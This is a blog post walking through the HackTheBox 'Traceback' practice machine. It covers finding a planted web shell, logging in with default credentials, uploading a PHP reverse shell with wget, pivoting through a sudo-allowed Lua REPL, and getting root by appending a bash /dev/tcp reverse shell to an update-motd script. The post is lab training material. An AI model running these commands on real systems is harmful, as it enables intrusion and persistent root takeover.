---
title: HackTheBox - Traceback
layout: post
date: 2020-08-15 23:00:00 +0800
---

![5eb1e9495a12b0323d8a529ea3e5af4b.png](/images/htb-traceback/44878c98a9b1419fab90d0c2b33efb0a.png)

### 0. Preface

A relatively easy box. Some lateral thinking and OSINT is required for the first section to get to user, but the rest of the box is pretty straightforward. 

In this box, we will be tackling: 

1. Further pwning a pwned website
2. Using a LUA REPL compiler to pivot to another user
3. Using MOTDs to get a root shell

<!--excerpt-->

---

### 1. Preliminary NMAP Scanx
```bash
sudo nmap -sC -sV -oN nmap.txt 10.10.10.181 -v
```
![4204251156cbf7305e30694634008f3a.png](/images/htb-traceback/2a8ec04482254b1ab6c75d5df9bdedc4.png)

This machine is running Ubuntu Linux. 

There are only two ports of interest on this machine - port 80 and 22. 

### 2. Web Server Enumeration

Accessing `http://10.10.10.181` leads us to a web server that seems to have been hacked prior: 

![e43e6bb04126f5bf4b01cdb73c098a9a.png](/images/htb-traceback/af3343165274495ca8aaeeb9d9949c0b.png)

Looking at the source of the website, we see that a comment has been added: 

![eacf96e44e51e251c522ea6792777581.png](/images/htb-traceback/4604820701d5419e89775bbc1c047402.png)

Googling the string *"best web shells you might need"* turns up this [Github Repository](https://github.com/TheBinitGhimire/Web-Shells) of web shells.

We will do a `git clone` of this repository first. Then using the list of .php files, run `gobuster` to find out if there are any web shells from the repository running on this web server. 

![010a44cebca3a53cc73c49471cba1c21.png](/images/htb-traceback/4f46843fa78640d6a53bcb8455e1f5e1.png)

![deb02ecaea62beed584055a6cc2ea31a.png](/images/htb-traceback/07c4b55d40e54fb381d77cd34323118a.png)

```bash
gobuster dir -u http://10.10.10.181 -w ./shells.txt
```

![4e02f1982bf15ee214c396d12d9b71a9.png](/images/htb-traceback/0126315cb82a4cb696c38f49cc4e5892.png)

From the `gobuster` results, `smevk.php` has been uploaded to the web server. Accessing `smevk.php` presents us with a login page. 

![fd9ebcfbcba57fd91c197d1280eea5b9.png](/images/htb-traceback/62e390cc8c2443018e07530b794cf492.png)

Looking at the source code for `smevk.php`, we can see that the default username and password to this webshell is `admin:admin`. We are able to successfully login with the default credentials. 

![4db134eabb2dd8bbd3beb78a0ebcf788.png](/images/htb-traceback/95d038f132b44fbc8d025f6ee30568b4.png)

![52414dbfad3f8f8de9dbd1ae53f471f3.png](/images/htb-traceback/b07a70854a5c4a1c894ac79da02dad75.png)

### 3. PHP Reverse Shell

Using this web shell, will upload our own reverse shell to the `/var/www/html` directory, which is the root directory of the web server.

We will be using the Console tab to do so. 

![a012cef6e15d330d355c670e326fd259.png](/images/htb-traceback/23c6989b316f4469bf2db6f599c36d4c.png)

Start a python3 http server on our local machine, then use `wget` on the remote machine to download the file. 

*(Local Machine)*
```bash
python3 -m http.server 8888
```
*(Remote Machine)*
```bash
wget http://10.10.14.43:8888/php-reverse-shell.php
mv php-reverse-shell.php main.php
```

![ec7a435997b8fe409970ffd5b272d70b.png](/images/htb-traceback/b0e1e7b4cd564d878298c03ef53a637c.png)

We will start a netcat listener on our machine, then trigger the shell by navigating to `http://10.10.10.181/main.php`. 

```bash
nc -lvnp 8000
```

![847f9d9c8378639dfdc0ee25e2695933.png](/images/htb-traceback/3509c524bea4455e9741a2bc6383f78b.png)

![d564a291918fbba3faf282b7bb1a1b58.png](/images/htb-traceback/4c15845a7dbc41f2860aafbb8e9169d6.png)

We can see that we are logged in as `webadmin`. Before proceeding, we will upgrade our shell to an interactive shell [using python3](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-3-upgrading-from-netcat-with-magic). 

### 4. Pivoting

Enumerating the machine manually, we can see that there's a note in the home directory of `webadmin`, which points to a tool to practice Lua with. 

![81b78ce7a957d56af4315ff64d7f9e8b.png](/images/htb-traceback/d34dbec3b95b4f80ba02b8895daac19e.png)

Running `sudo -l` tells us that `webadmin` can run `/home/sysadmin/luvit` as the user `sysadmin` without needing a password. A Google search for Luvit turns up a REPL (Read-Eval-Print-Loop) Lua compiler. 

Lua has a function to run OS commands using `os.execute('cmd')`, so we can make use of that to pivot us to `sysadmin`. 

```bash
sudo -u sysadmin /home/sysadmin/luvit
```

![f0226abfbaec72eba9c15d2d5e38b96a.png](/images/htb-traceback/35327b7f115b443aa975b9740939f515.png)

```lua
os.execute('whoami')
os.execute('/bin/bash')
```

![a2f14e68d2bc89ccfa3ce80328662d65.png](/images/htb-traceback/6ec1cc0b07af46c2ba3803ead24c1756.png)

### 5. Privilege Escalation 

Next, we will upload and run `linpeas.sh` on the machine for further enumeration. 

*(Local Machine)*
```bash
python3 -m http.server 8888
```
*(Remote Machine)*
```bash
wget http://10.10.10.181:8888/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![06d6f090fdf0902bf7e26fae3ec18571.png](/images/htb-traceback/7f0ff79f28a841c793a2b1638bf0a424.png)

From the output, we can see that `sysadmin` is able to edit the files in `update-motd`. These files are run as root when a new SSH session starts, displaying the motd. 

![37237d568e8d365167d520e0ee56e989.png](/images/htb-traceback/0b499953ea0b4754a36f2b0a11161185.png)

![5ec82e33c7884d65664373920b9be32f.png](/images/htb-traceback/92ccd1ba568b4d079fc0728a460a640f.png)

In order to exploit this, we will first generate an SSH key with ssh-keygen. 

![8545d6d5f930a013af92d79123491212.png](/images/htb-traceback/13cfcf50f18f4b41afe4f7d6bb751eea.png)

Next, copy the contents of `id_rsa.pub` to `/home/sysadmin/.ssh/authorized_keys`. This will allow us to use the generated private key to SSH into the machine. 

![4d9e0874cff944f09caffb95b277dcfe.png](/images/htb-traceback/eda40b582622493aa1fc86bec82b1093.png)

Next, we will append a script to trigger a bash reverse shell when the motd is run, using the file `/etc/update-motd.d/00-header`. 

*(Bash Reverse Shell Script)*
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.43/8000 0>&1'
```

![b407dc05875c44592a1c78955287e5ee.png](/images/htb-traceback/207a5288a4184c52840b569c657a5a14.png)

Next, we will start a netcat listener on our local machine, then SSH to the machine with `sysadmin` in order to trigger the reverse shell. 

```bash
nc -lvnp 8000
```
```bash
ssh sysadmin@10.10.10.181 -i id_rsa
```

![251715102e7a265be12a85eb1d0c6c7b.png](/images/htb-traceback/51ef160422904bdda7aaedc82351b00f.png)

